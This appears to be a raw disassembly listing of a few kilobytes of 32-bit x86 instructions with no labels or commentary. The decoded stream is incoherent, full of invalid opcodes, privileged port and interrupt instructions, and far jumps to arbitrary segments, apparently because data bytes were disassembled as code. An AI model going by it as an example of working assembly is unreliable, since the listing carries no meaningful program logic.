  4112a7:	jge    0x411252
  4112a9:	xchg   BYTE PTR [ebx-0x59],al
  4112ac:	mov    ah,0x60
  4112ae:	lock xchg esi,eax
  4112b0:	nop
  4112b1:	and    esp,DWORD PTR [edx]
  4112b3:	sbb    ah,BYTE PTR [esi-0x23f7df42]
  4112b9:	(bad)  [esi-0x61630fcd]
  4112bf:	sti    
  4112c0:	or     ah,BYTE PTR [ebp+eax*1-0x5b]
  4112c4:	retf   
  4112c5:	and    bl,BYTE PTR [edx]
  4112c7:	(bad)  
  4112c8:	outs   dx,BYTE PTR ds:[esi]
  4112c9:	adc    eax,0x17f25d98
  4112ce:	add    BYTE PTR [edi],ch
  4112d0:	or     BYTE PTR [eax+esi*4+0x40bc15c3],dl
  4112d7:	adc    BYTE PTR [edx],bh
  4112d9:	dec    ecx
  4112da:	mov    eax,0x55006e7d
  4112df:	loopne 0x4112b0
  4112e1:	push   0x28
  4112e3:	out    0xd6,al
  4112e5:	pop    ss
  4112e6:	sbb    al,0x78
  4112e8:	cmp    ah,BYTE PTR [esi+0x28716396]
  4112ee:	add    dh,dh
  4112f0:	cwde   
  4112f1:	add    edi,ecx
  4112f3:	cmp    DWORD PTR [ecx+ecx*8-0x51],ebx
  4112f7:	imul   esp,DWORD PTR [ecx],0xa8daa2c5
  4112fd:	and    al,0x13
  4112ff:	push   edi
  411300:	repz push esp
  411302:	loop   0x41130e
  411304:	cmp    ecx,eax
  411306:	mov    esp,0x24f94118
  41130b:	mov    dh,0x91
  41130d:	jl     0x4112ef
  41130f:	pop    ebx
  411310:	xchg   edx,eax
  411311:	rcr    BYTE PTR [eax-0x39331a39],1
  411317:	pop    ecx
  411318:	aad    0xf6
  41131a:	or     edx,edi
  41131c:	inc    esi
  41131d:	shr    DWORD PTR [edi-0x6a],cl
  411320:	int3   
  411321:	or     al,0x79
  411323:	jno    0x411361
  411325:	push   eax
  411326:	inc    esp
  411327:	xchg   DWORD PTR [ecx+0x331b0d96],ebp
  41132d:	or     eax,DWORD PTR [ecx]
  41132f:	and    cl,ah
  411331:	loope  0x4112de
  411333:	push   edi
  411334:	shl    BYTE PTR [eax],cl
  411336:	adc    edx,DWORD PTR [esi-0x6e]
  411339:	(bad)  
  41133a:	and    eax,DWORD PTR [ebx]
  41133c:	push   cs
  41133d:	or     esi,DWORD PTR [ebx-0x1c]
  411340:	and    bl,bh
  411342:	js     0x4112e0
  411344:	sub    ebx,DWORD PTR [edx]
  411346:	xor    bh,BYTE PTR [ebp+0x517211b3]
  41134c:	jecxz  0x4112d7
  41134e:	xor    eax,0xc68d54fa
  411353:	adc    al,0x12
  411355:	out    0x34,eax
  411357:	jb     0x41134d
  411359:	xchg   esp,eax
  41135a:	das    
  41135b:	call   0xda61:0xe5f697ef
  411362:	add    eax,DWORD PTR [eax+0x16]
  411365:	dec    ecx
  411366:	js     0x4113b5
  411368:	daa    
  411369:	pop    ecx
  41136a:	sub    bl,BYTE PTR [ebx]
  41136c:	jo     0x411354
  41136e:	jmp    0x411316
  411370:	call   0xdca8429f
  411375:	in     eax,0x25
  411377:	hlt    
  411378:	clc    
  411379:	mov    eax,0x65afd35d
  41137e:	pinsrw mm6,WORD PTR [edx+0x5a36422f],0xa3
  411386:	sub    eax,0x60c40864
  41138b:	mov    edx,ecx
  41138d:	data16 xor al,0xf0
  411390:	pop    es
  411391:	retf   0x75e8
  411394:	fs pop edi
  411396:	inc    edx
  411397:	icebp  
  411398:	xor    BYTE PTR [ecx-0x50],bl
  41139b:	sub    DWORD PTR [ebp+0x55],ecx
  41139e:	mov    al,ds:0x598d41f6
  4113a3:	loope  0x411400
  4113a5:	call   0x8192:0x989c2556
  4113ac:	call   0xd4e:0x923cc221
  4113b3:	mov    bl,0xf
  4113b5:	rol    DWORD PTR [ebp+ebp*8-0x35a44ee9],1
  4113bc:	(bad)  [edx+0x39]
  4113bf:	inc    edi
  4113c0:	jb     0x411423
  4113c2:	out    0xde,eax
  4113c4:	sti    
  4113c5:	into   
  4113c6:	dec    edi
  4113c7:	and    DWORD PTR [eax],esp
  4113c9:	cmc    
  4113ca:	xchg   ecx,eax
  4113cb:	mov    ds:0xe76b25a1,eax
  4113d0:	adc    eax,0x49d758af
  4113d5:	aas    
  4113d6:	jmp    0xe4cc:0xb1693004
  4113dd:	stos   DWORD PTR es:[edi],eax
  4113de:	popa   
  4113df:	fstp   TBYTE PTR [ecx+esi*2-0x40]
  4113e3:	mov    ebx,0x214f7515
  4113e8:	dec    eax
  4113e9:	lock jnp 0x411385
  4113ec:	addr16 add al,0x27
  4113ef:	fcom   QWORD PTR [eax-0x6b]
  4113f2:	test   al,0x8
  4113f4:	pushf  
  4113f5:	aaa    
  4113f6:	test   eax,0x823df187
  4113fb:	dec    esp
  4113fc:	call   0x8a5d:0x82360390
  411403:	add    dh,BYTE PTR [edx]
  411405:	mov    bl,al
  411407:	pushf  
  411408:	or     DWORD PTR [edx+0x7c],ebp
  41140b:	jno    0x411419
  41140d:	out    dx,al
  41140e:	push   0x6061fca8
  411413:	sub    BYTE PTR [edi],0x1f
  411416:	adc    al,0xcb
  411418:	mov    eax,ds:0x526dc080
  41141d:	push   eax
  41141e:	xor    BYTE PTR [ebx+0x62],dh
  411421:	mov    ch,0x7c
  411423:	loope  0x4113fb
  411425:	dec    esi
  411426:	hlt    
  411427:	pop    edx
  411428:	jecxz  0x41143e
  41142a:	(bad)  
  41142b:	ss pop esi
  41142d:	sub    BYTE PTR [eax-0x365798ea],ch
  411433:	and    BYTE PTR [ecx+esi*8+0x1fb7f3b4],bh
  41143a:	mov    eax,0xcf9bc5bd
  41143f:	add    eax,0x2f9fede8
  411444:	mov    ?,esp
  411446:	pop    ebp
  411447:	mov    dl,0xa9
  411449:	xchg   ebp,eax
  41144a:	adc    ebx,esi
  41144c:	dec    eax
  41144d:	dec    ebx
  41144e:	pop    ebp
  41144f:	fcom   DWORD PTR [eax+0xa0cd703]
  411455:	ins    BYTE PTR es:[edi],dx
  411456:	mov    dl,0xd7
  411458:	mov    cl,0x9f
  41145a:	sub    esp,ecx
  41145c:	inc    eax
  41145d:	dec    ecx
  41145e:	mov    DWORD PTR [esi],ecx
  411460:	sub    BYTE PTR [eax+edi*8+0x310a3392],0xc8
  411468:	pop    gs
  41146a:	aam    0x9b
  41146c:	inc    esp
  41146d:	int    0x70
  41146f:	lahf   
  411470:	jecxz  0x411438
  411472:	jmp    eax
  411474:	popa   
  411475:	push   edi
  411476:	mov    dh,0xe9
  411478:	es jp  0x4114ad
  41147b:	retf   
  41147c:	daa    
  41147d:	sbb    bl,BYTE PTR [edi-0x52]
  411480:	add    al,BYTE PTR [ebp-0xa8bee7c]
  411486:	jne    0x411462
  411488:	adc    esp,DWORD PTR [eax]
  41148a:	push   ebp
  41148b:	gs adc al,0x35
  41148e:	adc    al,0x39
  411490:	cmp    ebp,DWORD PTR [edx-0x4209f5ab]
  411496:	cmp    DWORD PTR [eax+esi*8-0x1cb17121],0x9fd95220
  4114a1:	stc    
  4114a2:	in     eax,dx
  4114a3:	push   ss
  4114a4:	jle    0x411461
  4114a6:	sar    esp,1
  4114a8:	push   0xffffffd9
  4114aa:	test   al,0x70
  4114ac:	push   edi
  4114ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114ae:	jmp    0x411523
  4114b0:	int    0x15
  4114b2:	xchg   DWORD PTR [esi+0x3d],eax
  4114b5:	adc    DWORD PTR [edi],esi
  4114b7:	xor    BYTE PTR [ebx],bh
  4114b9:	fist   WORD PTR [edx]
  4114bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114bc:	pop    esi
  4114bd:	push   esi
  4114be:	shl    esi,cl
  4114c0:	adc    cl,BYTE PTR ss:[ebp-0x48]
  4114c4:	sbb    ebp,0x22
  4114c7:	lds    esi,FWORD PTR [eax-0x7049f9a1]
  4114cd:	fiadd  WORD PTR [eax+0x70]
  4114d0:	xchg   ebx,eax
  4114d1:	xor    eax,0xc20c7926
  4114d6:	mov    ch,0xd4
  4114d8:	pop    ebx
  4114d9:	jno    0x4114e4
  4114db:	jo     0x411530
  4114dd:	aas    
  4114de:	xchg   ecx,eax
  4114df:	xsha256 (bad)
  4114e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114e1:	adc    ecx,DWORD PTR [edi]
  4114e3:	xor    bl,BYTE PTR [ecx+0x4c812a0]
  4114e9:	scas   al,BYTE PTR es:[edi]
  4114ea:	jle    0x4114b7
  4114ec:	mov    cl,0x1e
  4114ee:	cdq    
  4114ef:	in     eax,dx
  4114f0:	or     al,ch
  4114f2:	sbb    ebx,DWORD PTR [ebx-0x73]
  4114f5:	pop    edx
  4114f6:	aam    0x63
  4114f8:	jae    0x41155f
  4114fa:	jmp    0x41148f
  4114fc:	xchg   esp,eax
  4114fd:	lds    ebp,FWORD PTR [edx-0x3ab9c0af]
  411503:	and    al,0x10
  411505:	aad    0xf
  411507:	mov    esp,0x9a954a39
  41150c:	fiadd  DWORD PTR [eax+eiz*4+0x6a]
  411510:	out    0x93,al
  411512:	sahf   
  411513:	dec    ebx
  411514:	fwait
  411515:	std    
  411516:	mov    ch,0x46
  411518:	int    0x39
  41151a:	arpl   ax,bx
  41151c:	add    BYTE PTR [ebx+0x1c39b31a],0x72
  411523:	add    esi,DWORD PTR [ecx+0x239db7b1]
  411529:	aad    0x28
  41152b:	imul   BYTE PTR [ebx-0x4e6c14c]
  411531:	aad    0x7d
  411533:	jmp    0x4114cf
  411535:	cdq    
  411536:	mov    WORD PTR [eax],fs
  411538:	xchg   DWORD PTR [eax],esp
  41153a:	mov    bh,0xa2
  41153c:	shl    DWORD PTR [ecx],1
  41153e:	push   0xffffff98
  411540:	stos   BYTE PTR es:[edi],al
  411541:	ins    BYTE PTR es:[edi],dx
  411542:	sub    al,0xc8
  411544:	fistp  QWORD PTR [esi]
  411546:	sbb    BYTE PTR [eax],dl
  411548:	xchg   ecx,edi
  41154a:	push   eax
  41154b:	les    esp,FWORD PTR [esi+0x7c39a3e8]
  411551:	lods   al,BYTE PTR ds:[esi]
  411552:	xchg   edi,eax
  411553:	test   al,0x6b
  411555:	push   0xb7028879
  41155a:	pop    ds
  41155b:	pop    ebx
  41155c:	cmp    ah,BYTE PTR ds:0x9437cc3c
  411562:	push   edi
  411563:	mov    dh,0xc3
  411565:	in     al,dx
  411566:	inc    ebx
  411567:	cld    
  411568:	or     al,0x4b
  41156a:	and    eax,0x8ea4eda3
  41156f:	sub    BYTE PTR [edx+0x8],0xa
  411573:	loop   0x411513
  411575:	cld    
  411576:	iret   
  411577:	hlt    
  411578:	and    esp,DWORD PTR [ebp+0x7b]
  41157b:	jne    0x4115ab
  41157d:	ja     0x41151e
  41157f:	adc    cl,BYTE PTR [edi-0x338b6e9a]
  411585:	dec    esp
  411586:	and    eax,0xb960f3d5
  41158b:	aam    0x5e
  41158d:	fwait
  41158e:	lods   eax,DWORD PTR ds:[esi]
  41158f:	(bad)  
  411590:	mov    ah,0xbe
  411592:	and    esi,DWORD PTR [eax]
  411594:	dec    eax
  411595:	inc    eax
  411596:	or     eax,0xe8f6887e
  41159b:	aas    
  41159c:	or     DWORD PTR [ecx+0x42],eax
  41159f:	test   eax,0x142fedbc
  4115a4:	shl    DWORD PTR [edx-0x7c2fff0b],1
  4115aa:	xchg   esp,eax
  4115ab:	test   BYTE PTR [esi+0x5b],bh
  4115ae:	ja     0x4115a9
  4115b0:	xchg   edi,eax
  4115b1:	push   ebx
  4115b2:	push   ebp
  4115b3:	cli    
  4115b4:	jg     0x4115a7
  4115b6:	in     eax,dx
  4115b7:	push   ss
  4115b8:	pop    ecx
  4115b9:	xor    ah,BYTE PTR ds:0x85aca971
  4115bf:	dec    edx
  4115c0:	call   0x859000e1
  4115c5:	pushf  
  4115c6:	add    BYTE PTR [edi-0x23],0x90
  4115ca:	nop
  4115cb:	gs int 0x76
  4115ce:	pop    esi
  4115cf:	add    eax,0x132c162a
  4115d4:	jmp    0x6a8baf38
  4115d9:	aas    
  4115da:	shl    BYTE PTR [ecx+0x1d],cl
  4115dd:	dec    eax
  4115de:	sbb    BYTE PTR [ebx-0x64bdd746],cl
  4115e4:	imul   esp,ebx,0xffffffdc
  4115e7:	and    eax,0x95a64ce8
  4115ec:	into   
  4115ed:	cmp    BYTE PTR [edx+0x481efab0],dl
  4115f3:	adc    DWORD PTR [ebx-0x7cc17d73],0xe28e6ceb
  4115fd:	jl     0x4115e9
  4115ff:	jmp    0xc109be02
  411604:	add    DWORD PTR [ecx+0x57],ebp
  411607:	jg     0x41164d
  411609:	xchg   esp,eax
  41160a:	push   edi
  41160b:	add    DWORD PTR [eax-0x1eb1125b],ebp
  411611:	scas   eax,DWORD PTR es:[edi]
  411612:	xor    DWORD PTR [edx],eax
  411614:	cmp    edx,DWORD PTR [ebx]
  411616:	rep stos BYTE PTR es:[edi],al
  411618:	pushf  
  411619:	shl    ecx,cl
  41161b:	or     eax,0xc92bdeae
  411620:	lds    ebp,FWORD PTR [esp+ebp*4-0x2f0e3897]
  411627:	nop
  411628:	sub    al,0x7b
  41162a:	inc    eax
  41162b:	or     al,0x34
  41162d:	das    
  41162e:	cmp    BYTE PTR [ecx-0x421d907c],0x84
  411635:	push   0x396a4045
  41163a:	xchg   edx,eax
  41163b:	mov    al,bh
  41163d:	cwde   
  41163e:	sbb    BYTE PTR [ebx+0xd8ae2ce],dl
  411644:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411645:	mov    ch,0xa
  411647:	and    ebx,DWORD PTR [ebx+0x315102ce]
  41164d:	mov    ebp,0x6f179391
  411652:	xchg   ebp,eax
  411653:	outs   dx,BYTE PTR ds:[esi]
  411654:	leave  
  411655:	inc    eax
  411656:	lea    edi,[ebp-0x5a179fd6]
  41165c:	push   es
  41165d:	xor    DWORD PTR [ebx+0x7],esi
  411660:	xchg   esi,eax
  411661:	jmp    FWORD PTR [ebp+0x1d]
  411664:	mov    ecx,0xde7559ca
  411669:	test   ebp,ecx
  41166b:	jmp    0xbae5f24d
  411670:	stos   BYTE PTR es:[edi],al
  411671:	jne    0x41166d
  411673:	adc    al,0xb
  411675:	sbb    eax,0xcc740c0d
  41167a:	(bad)  
  41167b:	call   0x4d9c375b
  411680:	clc    
  411681:	and    edi,edi
  411683:	hlt    
  411684:	bnd jno 0x411666
  411687:	loop   0x4116f2
  411689:	stos   DWORD PTR es:[edi],eax
  41168a:	sar    DWORD PTR [ebp-0x6b861328],1
  411690:	push   edx
  411691:	rcr    bl,cl
  411693:	mov    ds:0x6d7cc83f,eax
  411698:	ficom  DWORD PTR [eax]
  41169a:	sbb    BYTE PTR [eax-0x50],0xc
  41169e:	mov    bh,0x5d
  4116a0:	sbb    al,0x96
  4116a2:	icebp  
  4116a3:	call   0x4dde:0x861bb16a
  4116aa:	mov    eax,0xbf00256b
  4116af:	pop    ebx
  4116b0:	repz mov eax,ds:0x85901f8a
  4116b6:	xor    eax,esi
  4116b8:	in     eax,0x60
  4116ba:	sbb    al,0x25
  4116bc:	add    BYTE PTR [ebx],cl
  4116be:	mov    cl,0xc5
  4116c0:	pop    esi
  4116c1:	into   
  4116c2:	jl     0x4116be
  4116c4:	xchg   edi,eax
  4116c5:	add    eax,0x57c3878c
  4116ca:	call   0x6d45:0x640fd29e
  4116d1:	mov    esi,0x7b931f0a
  4116d6:	and    eax,0xc7067a6
  4116db:	jecxz  0x4116d8
  4116dd:	test   al,0xd1
  4116df:	inc    edi
  4116e0:	or     eax,DWORD PTR [ebx-0x21f7e638]
  4116e6:	popf   
  4116e7:	dec    edi
  4116e8:	xor    DWORD PTR [edi*4+0x2f4dcdb],0x19
  4116f0:	inc    eax
  4116f1:	mov    cl,BYTE PTR [ebp-0x62]
  4116f4:	xor    eax,0xfe1e7a77
  4116f9:	es mov ebp,0xb16acc72
  4116ff:	push   0xedf503e9
  411704:	rcr    ebx,cl
  411706:	cs dec edi
  411708:	xor    esi,DWORD PTR ds:0x5eeef46d
  41170e:	retf   0x68b5
  411711:	shr    BYTE PTR [ebp+0x3f],cl
  411714:	inc    esp
  411715:	pop    ds
  411716:	outs   dx,BYTE PTR ds:[esi]
  411717:	push   ss
  411718:	sub    BYTE PTR [ebx-0x2933636a],bh
  41171e:	stos   DWORD PTR es:[edi],eax
  41171f:	jnp    0x4116ad
  411721:	push   edi
  411722:	mov    BYTE PTR [edx],0x87
  411725:	(bad)  
  411727:	out    0x61,al
  411729:	jbe    0x4117a5
  41172b:	jae    0x41175a
  41172d:	lods   al,BYTE PTR ds:[esi]
  41172e:	sub    DWORD PTR [edi-0x2cecd7bf],0x8dc122e1
  411738:	jge    0x4116cb
  41173a:	adc    DWORD PTR [esi+0x73],edx
  41173d:	push   es
  41173e:	ins    BYTE PTR es:[edi],dx
  41173f:	test   BYTE PTR [edi+0x32348f56],bl
  411745:	inc    eax
  411746:	sbb    DWORD PTR [edi-0x1fb352f1],ecx
  41174c:	add    eax,0x74a5be9d
  411751:	div    BYTE PTR [eax-0x4a8549d]
  411757:	sbb    eax,0x690e956a
  41175c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41175d:	ins    BYTE PTR es:[edi],dx
  41175e:	ret    0x8562
  411761:	outs   dx,BYTE PTR ds:[esi]
  411762:	cdq    
  411763:	lods   al,BYTE PTR ds:[esi]
  411764:	jmp    0x17fb5cdf
  411769:	retf   0x2b38
  41176c:	js     0x4117b9
  41176e:	js     0x4116f1
  411770:	sahf   
  411771:	mov    edx,gs
  411773:	fistp  QWORD PTR [ecx]
  411775:	or     DWORD PTR [edx],ebp
  411777:	pop    eax
  411778:	in     eax,0xad
  41177a:	test   BYTE PTR [ebp+0x17],dh
  41177d:	popa   
  41177e:	not    BYTE PTR [esi]
  411780:	xchg   ebx,eax
  411781:	and    ah,BYTE PTR [eax-0x22]
  411784:	xor    edi,DWORD PTR [ebx]
  411786:	rol    eax,1
  411788:	hlt    
  411789:	adc    ecx,eax
  41178b:	addr16 jo 0x411741
  41178e:	xchg   BYTE PTR [edx-0x7],dl
  411791:	xchg   esi,eax
  411792:	test   BYTE PTR [edi],ah
  411794:	mov    eax,0xdc3349ba
  411799:	jge    0x41178c
  41179b:	and    al,0x72
  41179e:	fidivr DWORD PTR [esi]
  4117a0:	int    0xc7
  4117a2:	(bad)  
  4117a3:	pop    esi
  4117a4:	test   BYTE PTR [edx-0x49],al
  4117a7:	in     al,0x7f
  4117a9:	pop    es
  4117aa:	xchg   esi,eax
  4117ab:	dec    ecx
  4117ac:	jmp    0xdacf07cb
  4117b1:	lods   eax,DWORD PTR ds:[esi]
  4117b2:	ret    0xb7ca
  4117b5:	mov    ah,BYTE PTR [ebx+0x645dc33d]
  4117bb:	icebp  
  4117bc:	jae    0x4117c6
  4117be:	jns    0x411816
  4117c0:	inc    edi
  4117c1:	mov    edx,0xea39a103
  4117c6:	sbb    DWORD PTR [ecx+0x27],esi
  4117c9:	nop
  4117ca:	arpl   WORD PTR [ebx-0x5bdc39ef],si
  4117d0:	fidivr WORD PTR [esi-0x38cac9b9]
  4117d6:	in     eax,0x1d
  4117d8:	aas    
  4117d9:	retf   0x9f07
  4117dc:	mov    ds:0x7c30a76e,eax
  4117e1:	xor    ebx,esp
  4117e3:	mov    al,ds:0xd55ab95d
  4117e8:	push   ebp
  4117e9:	or     dl,bl
  4117eb:	in     eax,dx
  4117ec:	jb     0x411804
  4117ee:	adc    DWORD PTR ds:0x8cabccd,esi
  4117f4:	mov    eax,0x538dddd3
  4117f9:	sub    al,0xe0
  4117fb:	jmp    0x4117f6
  4117fd:	cmp    DWORD PTR [ebp-0x791b6a0],edx
  411803:	cmc    
  411804:	jae    0x411812
  411806:	lahf   
  411807:	idiv   BYTE PTR [ebx]
  411809:	repnz out dx,eax
  41180b:	xor    DWORD PTR [eax+edx*4-0x63],ecx
  41180f:	mov    esp,cs
  411811:	cli    
  411812:	aam    0x1a
  411814:	shl    DWORD PTR [eax-0x5af00c12],0x14
  41181b:	adc    al,0x32
  41181d:	js     0x4117c0
  41181f:	mov    ds:0xc2f1fe99,eax
  411824:	(bad)  
  411825:	adc    eax,0x5ee6f90f
  41182a:	aas    
  41182b:	xchg   esi,eax
  41182c:	loopne 0x4117cf
  41182e:	fs aam 0xa
  411831:	lahf   
  411832:	ds jbe 0x411882
  411835:	add    al,0xa4
  411837:	retf   0x4e68
  41183a:	add    DWORD PTR [edi],edi
  41183c:	fsubr  DWORD PTR [ecx-0x59cae6ba]
  411842:	enter  0xa831,0x3d
  411846:	cmp    BYTE PTR [esi-0x510558fe],al
  41184c:	ins    DWORD PTR es:[edi],dx
  41184d:	and    ch,BYTE PTR [ecx+0x6b193c6c]
  411853:	mov    edx,gs
  411855:	pop    ebx
  411856:	ja     0x41183c
  411858:	pop    ds
  411859:	jecxz  0x411829
  41185b:	jge    0x41182b
  41185d:	fcomp  DWORD PTR [eiz*4+0x2ddf6ba4]
  411864:	js     0x41183b
  411866:	mov    ebx,0x3993f41
  41186b:	xor    BYTE PTR [esi+0x6a52bbf0],cl
  411871:	sbb    DWORD PTR [ecx],edi
  411873:	in     eax,dx
  411874:	sbb    BYTE PTR ds:0xbc8a6283,0x4a
  41187b:	pop    eax
  41187c:	xchg   esp,eax
  41187d:	ret    
  41187e:	sub    DWORD PTR [esp+edi*8+0x5d7c3fcf],0xf6338cd6
  411889:	sbb    dl,BYTE PTR [edx]
  41188b:	jg     0x4118d7
  41188d:	int3   
  41188e:	inc    edi
  41188f:	push   ds
  411890:	addr16 push eax
  411892:	out    0xbd,eax
  411894:	jmp    0x80db:0x2d651aea
  41189b:	in     al,0x88
  41189d:	fidiv  DWORD PTR [esp+esi*1]
  4118a0:	adc    al,0x64
  4118a2:	push   0x8d7c5458
  4118a7:	mov    ebp,0x1d835100
  4118ac:	fistp  WORD PTR [esi+0x67]
  4118af:	adc    edx,DWORD PTR [edi-0x73c114a1]
  4118b5:	fmul   DWORD PTR [edi]
  4118b7:	jns    0x4118be
  4118b9:	mov    ecx,0x5b0e21c
  4118be:	adc    al,0x18
  4118c0:	fwait
  4118c1:	sub    eax,0xa8f090b2
  4118c6:	sar    BYTE PTR [eax],cl
  4118c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4118c9:	aas    
  4118ca:	mov    ebx,DWORD PTR [esi+0x6b]
  4118cd:	cmp    BYTE PTR [ebp+0x1],dl
  4118d0:	arpl   WORD PTR [edx-0x5f9c82ae],sp
  4118d6:	icebp  
  4118d7:	sub    BYTE PTR [ecx+0x29],0x63
  4118db:	sti    
  4118dc:	jge    0x4118d4
  4118de:	xor    DWORD PTR [ebp+edx*1+0x35],0x7
  4118e3:	lods   eax,DWORD PTR ds:[esi]
  4118e4:	or     eax,0x46e26d24
  4118e9:	cld    
  4118ea:	lahf   
  4118eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118ec:	jns    0x4118b6
  4118ee:	sub    al,0xe4
  4118f0:	jno    0x411894
  4118f2:	data16 fs ins BYTE PTR es:[edi],dx
  4118f5:	mov    al,ch
  4118f7:	lahf   
  4118f8:	(bad)  
  4118f9:	je     0x4118dd
  4118fb:	in     al,dx
  4118fc:	bound  ebx,QWORD PTR [eax-0x36bb04e8]
  411902:	or     eax,DWORD PTR [esi-0x42]
  411905:	lods   al,BYTE PTR ds:[esi]
  411906:	rcl    DWORD PTR [edx+0xb],cl
  411909:	and    eax,0x82dc52a2
  41190e:	push   0x843657ba
  411913:	dec    ebp
  411914:	lea    edx,[ecx-0x775c2fc7]
  41191a:	retf   
  41191b:	fnstsw WORD PTR [ebx+0x53]
  41191e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41191f:	cld    
  411920:	rcr    DWORD PTR [ebp+0x12],0x6c
  411924:	xor    eax,0xb19bdced
  411929:	sbb    BYTE PTR [esi+0xa],dh
  41192c:	mov    dh,BYTE PTR [esi+0x2bfb956a]
  411932:	cwde   
  411933:	xor    DWORD PTR [edx+eax*1],ecx
  411936:	sti    
  411937:	ror    BYTE PTR [edx+0x68],cl
  41193a:	mov    bl,0xf6
  41193c:	ds jnp 0x4119b0
  41193f:	sbb    ebp,DWORD PTR [eax]
  411941:	popa   
  411942:	dec    ebx
  411943:	jl     0x41199a
  411945:	xor    edx,esi
  411947:	lods   eax,DWORD PTR ds:[esi]
  411948:	call   0xc4bff49
  41194d:	sub    bl,BYTE PTR [ebx]
  41194f:	into   
  411950:	scas   al,BYTE PTR es:[edi]
  411951:	loopne 0x411930
  411953:	scas   al,BYTE PTR es:[edi]
  411954:	nop
  411955:	push   ecx
  411956:	push   0x1c
  411958:	sub    eax,0xf8f0cc95
  41195d:	sahf   
  41195e:	(bad)  
  41195f:	cmp    BYTE PTR [ecx+0xe4aa197],bl
  411965:	rcl    dl,1
  411967:	xor    al,0x1e
  411969:	jecxz  0x411908
  41196b:	mov    cl,0x32
  41196d:	mov    edi,0x752f4b73
  411972:	xchg   edi,eax
  411973:	xchg   edx,eax
  411974:	mov    dh,0xe5
  411976:	mov    ss,WORD PTR [esi-0x6ae09d17]
  41197c:	xlat   BYTE PTR ds:[ebx]
  41197d:	adc    eax,0x2e247c5f
  411982:	es es cs xchg edi,eax
  411986:	hlt    
  411987:	and    eax,ecx
  411989:	sub    BYTE PTR [ecx+0x3a],0xac
  41198d:	pop    eax
  41198e:	xor    DWORD PTR [edi],ecx
  411990:	mov    BYTE PTR [ecx],0x8a
  411993:	pop    eax
  411994:	pop    ds
  411995:	cmp    BYTE PTR [eax-0x16],dh
  411998:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411999:	jmp    FWORD PTR [edi]
  41199b:	daa    
  41199c:	mov    bh,0x3
  41199e:	push   eax
  41199f:	cmp    bh,dl
  4119a1:	xor    BYTE PTR [edi-0x1900602e],bh
  4119a7:	ror    DWORD PTR [eax],0x44
  4119aa:	dec    ebp
  4119ab:	pop    esp
  4119ac:	and    ch,0x0
  4119af:	test   BYTE PTR [esi-0x14],ah
  4119b2:	fiadd  DWORD PTR [edx+0x5c60dbf6]
  4119b8:	mov    eax,ds:0x45fd2e69
  4119bd:	std    
  4119be:	not    DWORD PTR [ebx+0x39]
  4119c1:	out    0xa6,eax
  4119c3:	cs test bl,ah
  4119c6:	sti    
  4119c7:	pop    es
  4119c8:	outs   dx,DWORD PTR ds:[esi]
  4119c9:	jmp    0x480d:0x271449f9
  4119d0:	dec    BYTE PTR [eax+0x4b1d471d]
  4119d6:	xor    al,0xca
  4119d8:	adc    ecx,esi
  4119da:	arpl   WORD PTR ds:0x655eccc3,bx
  4119e0:	jle    0x411a54
  4119e2:	dec    edx
  4119e3:	add    al,0x1e
  4119e5:	sub    DWORD PTR [esi-0x10c41d63],0x7caed0c3
  4119ef:	in     eax,dx
  4119f0:	push   eax
  4119f1:	fwait
  4119f2:	sahf   
  4119f3:	mov    ebp,0x31509879
  4119f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119f9:	sbb    bh,0xfe
  4119fc:	out    dx,eax
  4119fd:	dec    ebx
  4119fe:	lahf   
  4119ff:	cmp    ebp,DWORD PTR [esi+0x29]
  411a02:	cs idiv cl
  411a05:	rcl    ecx,0xe5
  411a08:	sahf   
  411a09:	loopne 0x411a16
  411a0b:	cmp    dl,dl
  411a0d:	dec    ebp
  411a0e:	jnp    0x4119f9
  411a10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a11:	in     al,0xb
  411a13:	int3   
  411a14:	cs push 0x48
  411a17:	pop    es
  411a18:	rep lods al,BYTE PTR ds:[esi]
  411a1a:	lds    eax,FWORD PTR [ebx-0x4d2b3de2]
  411a20:	jno    0x4119f3
  411a22:	xor    esp,DWORD PTR [edx]
  411a24:	rcl    BYTE PTR [ecx+0x43],1
  411a27:	retf   0xd14f
  411a2a:	pop    esp
  411a2b:	or     eax,0x83823c25
  411a30:	inc    esi
  411a31:	mov    al,0x71
  411a33:	dec    edx
  411a34:	sahf   
  411a35:	mov    ebx,DWORD PTR [ebp-0x6586520d]
  411a3b:	ja     0x411a96
  411a3d:	outs   dx,BYTE PTR ds:[esi]
  411a3e:	mov    DWORD PTR [edx*1-0x3da9c358],edx
  411a45:	mov    ds:0xe199ad21,eax
  411a4a:	(bad)  
  411a4b:	out    dx,al
  411a4c:	stc    
  411a4d:	es popf 
  411a4f:	add    ch,BYTE PTR [ebx-0x33b8a577]
  411a55:	xchg   esi,edx
  411a57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a58:	aam    0xbb
  411a5a:	cli    
  411a5b:	mov    DWORD PTR [esi],edx
  411a5d:	sub    ch,dh
  411a5f:	sub    al,BYTE PTR [edi-0x6d]
  411a62:	or     ecx,DWORD PTR [edi]
  411a64:	out    dx,al
  411a65:	aam    0x9c
  411a67:	xlat   BYTE PTR ds:[ebx]
  411a68:	add    eax,0xfc07654f
  411a6d:	or     eax,0x9fc34bdc
  411a72:	mov    ebp,0x8a84b647
  411a77:	outs   dx,BYTE PTR ds:[esi]
  411a78:	call   0xc7dd:0xdc444524
  411a7f:	add    DWORD PTR [esi-0x64943f3d],0x2a137efb
  411a89:	fadd   DWORD PTR [edi-0x50e69f5d]
  411a8f:	dec    edx
  411a90:	jno    0x411a32
  411a92:	jbe    0x411ac8
  411a94:	dec    edx
  411a95:	and    eax,0x5ada8e3a
  411a9a:	pop    es
  411a9b:	cmp    al,0x67
  411a9d:	sub    al,0xf5
  411a9f:	sub    esi,edi
  411aa1:	(bad)  
  411aa2:	mov    cl,dh
  411aa4:	jl     0x411b21
  411aa6:	inc    ecx
  411aa7:	lahf   
  411aa8:	dec    esp
  411aa9:	stos   DWORD PTR es:[edi],eax
